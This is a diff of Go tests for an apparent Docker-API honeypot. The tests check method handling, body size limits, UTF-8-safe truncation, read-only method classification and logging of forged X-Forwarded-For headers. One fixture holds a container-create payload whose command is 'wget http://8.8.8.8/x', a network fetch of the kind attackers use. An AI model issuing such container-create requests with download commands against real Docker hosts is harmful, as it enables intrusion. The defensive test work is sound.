@@ -36,6 +36,13 @@ func TestDockerRequests(t *testing.T) {
 		{name: "image pull", method: "POST", path: "/images/create?fromImage=evil", status: 403, attack: true},
 		{name: "delete", method: "DELETE", path: "/containers/abc", status: 403, attack: true},
 		{name: "unknown post", method: "POST", path: "/other", status: 404, attack: true},
+		{name: "options", method: "OPTIONS", path: "/version", status: 200},
+		{name: "options unknown", method: "OPTIONS", path: "/nothing", status: 404},
+		{name: "head", method: "HEAD", path: "/version", status: 200},
+		{name: "put", method: "PUT", path: "/containers/abc/archive", status: 403, attack: true},
+		{name: "patch", method: "PATCH", path: "/other", status: 404, attack: true},
+		{name: "propfind", method: "PROPFIND", path: "/containers/json", status: 403, attack: true},
+		{name: "trace", method: "TRACE", path: "/version", status: 404, attack: true},
 		{name: "get with body", method: "GET", path: "/version", body: `{"a":1}`, status: 200, attack: true},
 		{name: "oversized body", method: "POST", path: "/containers/create", body: `{"Image":"` + strings.Repeat("a", 40000) + `"}`, status: 403, attack: true},
 		{name: "long path", method: "POST", path: "/" + strings.Repeat("p", 2000), status: 404, attack: true},
@@ -51,7 +58,7 @@ func TestDockerRequests(t *testing.T) {
 			if tc.wantBody != "" && !strings.Contains(res.body, tc.wantBody) {
 				t.Errorf("body = %q, want it to contain %q", res.body, tc.wantBody)
 			}
-			if tc.path != "/_ping" && !json.Valid([]byte(res.body)) {
+			if tc.path != "/_ping" && tc.method != "HEAD" && !json.Valid([]byte(res.body)) {
 				t.Errorf("body is not JSON: %q", res.body)
 			}
 			ev := h.waitClass(t, tc.attack)
@@ -178,5 +185,101 @@ func TestParseDockerBody(t *testing.T) {
 	}
 	if n := strings.Count(cmd, " ") + 1; n > maxDockerCmdItems {
 		t.Errorf("%d words, want <= %d", n, maxDockerCmdItems)
+	}
+}
+
+func TestDockerMalformedBodyHasNoImageOrCmd(t *testing.T) {
+	t.Parallel()
+	h := startDocker(t)
+	stubDo(t, h.addr, "POST", "/containers/create", nil, `{"Image":`)
+	ev := waitAttack(t, h.sink)
+	if ev.Meta["image"] != "" || ev.Meta["command"] != "docker create image= cmd=" {
+		t.Errorf("meta = %v, want empty image and cmd", ev.Meta)
+	}
+}
+
+func TestDockerOversizedBodyIsBounded(t *testing.T) {
+	t.Parallel()
+	h := startDocker(t)
+	body := `{"Image":"` + strings.Repeat("a", 40000) + `"}`
+	stubDo(t, h.addr, "POST", "/containers/create", nil, body)
+	ev := waitAttack(t, h.sink)
+	if ev.Meta["image"] != "" || ev.Meta["command"] != "docker create image= cmd=" {
+		t.Errorf("meta = %v, want nothing taken from a body over the limit", ev.Meta)
+	}
+	// A read-only request with a body over the limit logs at most the limit.
+	h = startDocker(t)
+	stubDo(t, h.addr, "GET", "/version", nil, strings.Repeat("a", 40000))
+	ev = waitAttack(t, h.sink)
+	if ev.Info.PayloadBytes == 0 || ev.Info.PayloadBytes > maxHTTPBody {
+		t.Errorf("payload bytes = %d, want 1..%d", ev.Info.PayloadBytes, maxHTTPBody)
+	}
+}
+
+func TestDockerLongImageKeepsCommand(t *testing.T) {
+	t.Parallel()
+	h := startDocker(t)
+	body := `{"Image":"` + strings.Repeat("i", 256) + `","Cmd":["wget","http://8.8.8.8/x"]}`
+	stubDo(t, h.addr, "POST", "/containers/create", nil, body)
+	ev := waitAttack(t, h.sink)
+	if !strings.Contains(ev.Meta["command"], "cmd=wget http://8.8.8.8/x") {
+		t.Errorf("command meta %q lost the cmd part", ev.Meta["command"])
+	}
+	if len(ev.Meta["image"]) > maxDockerImageBytes {
+		t.Errorf("image meta is %d bytes, want <= %d", len(ev.Meta["image"]), maxDockerImageBytes)
+	}
+}
+
+func TestDockerMultibyteImageStaysValidUTF8(t *testing.T) {
+	t.Parallel()
+	h := startDocker(t)
+	body := `{"Image":"` + strings.Repeat("€", 43) + `","Cmd":["id"]}`
+	stubDo(t, h.addr, "POST", "/containers/create", nil, body)
+	ev := waitAttack(t, h.sink)
+	for k, v := range ev.Meta {
+		if !utf8.ValidString(v) {
+			t.Errorf("meta %s is not valid UTF-8: %q", k, v)
+		}
+	}
+	if img := ev.Meta["image"]; img == "" || len(img) > maxDockerImageBytes {
+		t.Errorf("image meta = %q", img)
+	}
+}
+
+func TestDockerForgedForwardedForIsOnlyLogged(t *testing.T) {
+	t.Parallel()
+	h := startDocker(t)
+	stubDo(t, h.addr, "POST", "/containers/create", map[string]string{"X-Forwarded-For": "8.8.8.8"}, `{"Image":"alpine"}`)
+	ev := waitAttack(t, h.sink)
+	if ev.Info.SourceIP != "127.0.0.1" {
+		t.Errorf("alert ip = %q, want the socket peer", ev.Info.SourceIP)
+	}
+	if out := h.logs.String(); !strings.Contains(out, `"claimed_client_ip":"8.8.8.8"`) {
+		t.Errorf("claimed_client_ip not logged:\n%s", out)
+	}
+}
+
+func TestTruncateRunes(t *testing.T) {
+	t.Parallel()
+	in := strings.Repeat("€", 43)
+	for n := 0; n <= len(in)+1; n++ {
+		got := truncateRunes(in, n)
+		if len(got) > n || !utf8.ValidString(got) {
+			t.Fatalf("truncateRunes(%d) = %q", n, got)
+		}
+	}
+}
+
+func TestIsReadOnlyMethod(t *testing.T) {
+	t.Parallel()
+	want := map[string]bool{
+		"GET": true, "HEAD": true, "OPTIONS": true,
+		"POST": false, "PUT": false, "PATCH": false, "DELETE": false,
+		"PROPFIND": false, "CONNECT": false, "TRACE": false, "": false, "get": false,
+	}
+	for m, w := range want {
+		if got := isReadOnlyMethod(m); got != w {
+			t.Errorf("isReadOnlyMethod(%q) = %v, want %v", m, got, w)
+		}
 	}
 }
